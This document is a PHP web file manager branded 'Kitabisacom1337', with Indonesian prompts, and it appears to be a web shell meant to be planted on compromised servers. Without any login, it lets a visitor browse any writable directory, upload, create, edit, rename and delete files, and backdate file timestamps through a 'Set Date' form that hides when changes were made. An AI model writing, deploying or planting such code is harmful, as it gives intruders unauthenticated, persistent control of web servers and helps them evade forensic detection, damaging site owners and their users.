<?php
session_start();

if (!isset($_SESSION['directory'])) {
    $_SESSION['directory'] = __DIR__ . '/';
}
$directory = $_SESSION['directory'];
$uploadMessage = "";
$fileContent = null;

if (!is_writable($directory)) {
    die("Error: Directory is not writable.");
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['create'])) {
        $filename = basename($_POST['filename']);
        if (!empty($filename) && !file_exists($directory . $filename)) {
            file_put_contents($directory . $filename, "");
            $uploadMessage = "File created: " . htmlspecialchars($filename);
        } else {
            $uploadMessage = "File exists or invalid.";
        }
    }

    if (isset($_POST['edit'])) {
        $filename = basename($_POST['filename']);
        $content = $_POST['content'];
        if (file_exists($directory . $filename)) {
            file_put_contents($directory . $filename, $content);
            $uploadMessage = "File updated: " . htmlspecialchars($filename);
        } else {
            $uploadMessage = "File not found.";
        }
    }

    if (isset($_POST['upload'])) {
        $uploadedFile = basename($_FILES['file']['name']);
        if (move_uploaded_file($_FILES['file']['tmp_name'], $directory . $uploadedFile)) {
            $uploadMessage = "Uploaded: " . htmlspecialchars($uploadedFile);
        } else {
            $uploadMessage = "Upload failed.";
        }
    }

    if (isset($_POST['rename'])) {
        $old = basename($_POST['old_name']);
        $new = basename($_POST['new_name']);
        if (file_exists($directory . $old) && !file_exists($directory . $new)) {
            rename($directory . $old, $directory . $new);
            $uploadMessage = "Renamed to: " . htmlspecialchars($new);
        } else {
            $uploadMessage = "Rename failed.";
        }
    }

    if (isset($_POST['delete'])) {
        $file = basename($_POST['file_to_delete']);
        if (file_exists($directory . $file)) {
            unlink($directory . $file);
            $uploadMessage = "Deleted: " . htmlspecialchars($file);
        } else {
            $uploadMessage = "Delete failed.";
        }
    }

    if (isset($_POST['change_dir'])) {
        $new = rtrim($_POST['new_directory'], '/') . '/';
        if (is_dir($new) && is_writable($new)) {
            $_SESSION['directory'] = realpath($new) . '/';
            $directory = $_SESSION['directory'];
            $uploadMessage = "Changed to: " . htmlspecialchars($directory);
        } else {
            $uploadMessage = "Invalid directory.";
        }
    }

    if (isset($_POST['load'])) {
        $filename = basename($_POST['filename']);
        if (file_exists($directory . $filename)) {
            $fileContent = file_get_contents($directory . $filename);
            $_SESSION['edit_filename'] = $filename;
        } else {
            $uploadMessage = "File not found.";
        }
    }

    if (isset($_POST['set_date'])) {
        $filename = basename($_POST['filename']);
        $time = strtotime($_POST['creation_date']);
        if (file_exists($directory . $filename) && $time !== false) {
            touch($directory . $filename, $time, $time);
            $uploadMessage = "Date updated.";
        } else {
            $uploadMessage = "Date update failed.";
        }
    }

    if (isset($_POST['preview'])) {
        $filename = basename($_POST['filename']);
        if (file_exists($directory . $filename)) {
            $fileContent = file_get_contents($directory . $filename);
            $previewFile = $filename;
        }
    }
}

$allFiles = array_diff(scandir($directory), ['..', '.']);
$parentDir = dirname(rtrim($directory, '/')) . '/';

function getFileTimes($file) {
    return [
        'created' => file_exists($file) ? date('Y-m-d H:i:s', filectime($file)) : 'N/A',
        'modified' => file_exists($file) ? date('Y-m-d H:i:s', filemtime($file)) : 'N/A',
    ];
}

function formatSize($size) {
    if ($size >= 1073741824) return number_format($size / 1073741824, 2) . ' GB';
    elseif ($size >= 1048576) return number_format($size / 1048576, 2) . ' MB';
    elseif ($size >= 1024) return number_format($size / 1024, 2) . ' KB';
    return $size . ' bytes';
}

$dirs = [];
$files = [];

foreach ($allFiles as $f) {
    $path = $directory . $f;
    if (is_dir($path)) {
        $dirs[] = $f;
    } else {
        $files[] = $f;
    }
}

// Gabungkan folder dan file, dengan folder terlebih dahulu
$sortedFiles = array_merge($dirs, $files);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Kitabisacom1337 - File Manager</title>
    <style>
        body {
            background: #111;
            color: #eee;
            font-family: monospace;
            margin: 0;
            padding: 0;
        }
        .container {
            display: flex;
            flex-wrap: wrap;
            padding: 20px;
            gap: 20px;
        }
        .panel {
            background: #222;
            border-radius: 8px;
            padding: 15px;
            flex: 1;
            min-width: 300px;
        }
        input, textarea, button {
            width: 100%;
            margin: 5px 0;
            padding: 8px;
            background: #333;
            color: #fff;
            border: 1px solid #444;
            border-radius: 4px;
        }
        button:hover {
            background: #444;
        }
        .file-list li {
            background: #2a2a2a;
            margin: 8px 0;
            padding: 10px;
            border-radius: 5px;
        }
        .top-bar {
            background: #1b1b1b;
            padding: 15px;
            font-size: 1.2em;
        }
        .message {
            padding: 10px;
            background: #333;
            color: #0f0;
            font-weight: bold;
        }
        .modal {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.7);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
        }
        .modal-content {
            background: #1e1e1e;
            padding: 15px;
            border-radius: 8px;
            width: 400px;
            max-height: 80%;
            overflow-y: auto;
            box-shadow: 0 0 10px rgba(0,0,0,0.5);
            position: relative;
            color: #fff;
            font-family: monospace;
        }
        .modal-content textarea {
            width: 100%;
            background: #2c2c2c;
            color: #fff;
            border: 1px solid #444;
            border-radius: 4px;
            padding: 8px;
            font-family: monospace;
        }
        .close {
            position: absolute;
            top: 5px;
            right: 10px;
            background: #900;
            color: white;
            padding: 5px 10px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
    </style>
</head>
<body>
<div class="top-bar">
    <img src="https://i.ibb.co/H4XfdZC/image.png" alt="Logo" style="height: 80px; vertical-align: middle; margin-right: 40px;">
</div>
<div class="message"><?php echo $uploadMessage; ?></div>
<div class="container">
    <div class="panel">
        <h3>Fitur Tersedia :</h3>
        <form method="post">
            <input type="text" name="new_directory" placeholder="Change Directory" required>
            <button name="change_dir">Change Directory</button>
        </form>
        <form method="post">
            <input type="text" name="filename" placeholder="Create File" required>
            <button name="create">Create</button>
        </form>
        <form method="post">
            <input type="text" name="old_name" placeholder="Old Name" required>
            <input type="text" name="new_name" placeholder="New Name" required>
            <button name="rename">Rename</button>
        </form>
        <form method="post">
            <input type="text" name="file_to_delete" placeholder="File to Delete" required>
            <button name="delete">Delete</button>
        </form>
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="file" required>
            <button name="upload">Upload</button>
        </form>
        <form method="post">
            <input type="text" name="filename" placeholder="Edit File" required>
            <button name="load">Load</button>
        </form>
        <?php if (!is_null($fileContent)): ?>
        <form method="post">
            <input type="hidden" name="filename" value="<?php echo htmlspecialchars($_SESSION['edit_filename'] ?? ''); ?>">
            <textarea name="content" rows="10"><?php echo htmlspecialchars($fileContent); ?></textarea>
            <button name="edit">Save</button>
        </form>
        <?php endif; ?>
    </div>
    <div class="panel">
        <h3>📄 Files in <?php echo htmlspecialchars($directory); ?></h3>
        <ul class="file-list">
            <?php if ($directory !== $_SERVER['DOCUMENT_ROOT'] . '/' && $directory !== __DIR__ . '/'): ?>
            <li>
                <form method="post" style="display:inline;">
                    <input type="hidden" name="new_directory" value="<?php echo htmlspecialchars($parentDir); ?>">
                    <button name="change_dir">🔙 Back</button>
                </form>
            </li>
            <?php endif; ?>
            <?php foreach ($sortedFiles as $f): 
                $path = $directory . $f;
                $info = getFileTimes($path);
            ?>
            <li>
                <b><?php echo htmlspecialchars($f); ?></b><br>
                <?php if (is_dir($path)): ?>
                    📁 
                    <form method="post" style="display:inline;">
                        <input type="hidden" name="new_directory" value="<?php echo htmlspecialchars(realpath($path)); ?>">
                        <button name="change_dir">Open</button>
                    </form>
                <?php else: ?>
                    📄 Size: <?php echo formatSize(filesize($path)); ?><br>
                    Created: <?php echo $info['created']; ?><br>
                    Modified: <?php echo $info['modified']; ?><br>
                    <form method="post" style="display:inline;">
                        <input type="hidden" name="filename" value="<?php echo htmlspecialchars($f); ?>">
                        <input type="datetime-local" name="creation_date" required>
                        <button name="set_date">Set Date</button>
                    </form>
                    <form method="post" style="display:inline;">
                        <input type="hidden" name="filename" value="<?php echo htmlspecialchars($f); ?>">
                        <button name="preview">👁️ View</button>
                    </form>
                <?php endif; ?>
            </li>
            <?php endforeach; ?>
        </ul>
    </div>
</div>

<?php if (isset($previewFile) && !empty($fileContent)): ?>
<div class="modal" id="previewModal" style="display:flex;">
    <div class="modal-content">
        <button class="close" onclick="document.getElementById('previewModal').style.display='none';">Close</button><br/>
        <h3>Preview: <?php echo htmlspecialchars($previewFile); ?></h3>
        <form method="post" onsubmit="return confirm('Yakin bro mau edit Filenya?');">
            <input type="hidden" name="filename" value="<?php echo htmlspecialchars($previewFile); ?>">
            <textarea name="content" rows="10"><?php echo htmlspecialchars($fileContent); ?></textarea>
            <button name="edit">Save</button>
        </form>
        <form method="post" onsubmit="return confirm('Yakin bro mau delete Filenya?');">
            <input type="hidden" name="file_to_delete" value="<?php echo htmlspecialchars($previewFile); ?>">
            <button name="delete">Delete</button>
        </form>
    </div>
</div>
<?php endif; ?>
</body>
</html>
